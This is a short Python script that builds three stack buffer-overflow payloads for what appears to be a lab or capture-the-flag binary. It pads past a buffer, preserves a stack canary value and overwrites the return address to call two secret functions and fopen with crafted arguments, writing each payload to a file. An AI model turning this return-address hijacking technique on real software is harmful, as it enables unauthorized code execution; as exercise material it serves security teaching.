import struct

# convert integer to byte array (integer little endian)
def dw(i):
    return struct.pack("<I",i)

# number of characters to return address location
offset = 49

# tasks' functions' addresses
parrot_value = 44 # value of parrot variable
secret_func1_addr = 0x004013e0
secret_func2_addr = 0x00401409
fopen_addr = 0x6ff6b2c4

# Initialize payloads.
# Username: NOP
# Password: IDA_1z_y0ur_fr1end
payload_initial = 'NOP\nIDA_1z_y0ur_fr1end\n' # Username + Password
payload_a = ''
payload_b = ''
payload_c = ''

# add a number of 'offset' A characters to the payload_initial
# after 'offset' bytes we have parrot variable which we must preserve
payload_initial += 'A' * offset

# add parrot_value and the offset till return address
payload_a += payload_initial + dw(parrot_value) + 'A' * 12
payload_b += payload_initial + dw(parrot_value) + 'A' * 12
payload_c += payload_initial + dw(parrot_value) + 'A' * 12

# configure each payload with the function address and what it needs
payload_a += dw(secret_func1_addr)

# for payload_b we add the function parameters
payload_b += dw(secret_func2_addr) + 'A' * 4 + dw(11) + dw(17) + dw(17) + dw(15)

# for payload_c wee add the pointer to "Stefan" and "w" from the constants in main
payload_c += dw(fopen_addr) + 'A' * 4 + dw(0x0040a17b + 9) + dw(0x0040a18b + 4)

# write to files each payload
with open('payload_a', 'wb') as f:
    f.write(payload_a)

with open('payload_b', 'wb') as f:
    f.write(payload_b)

with open('payload_c', 'wb') as f:
	f.write(payload_c)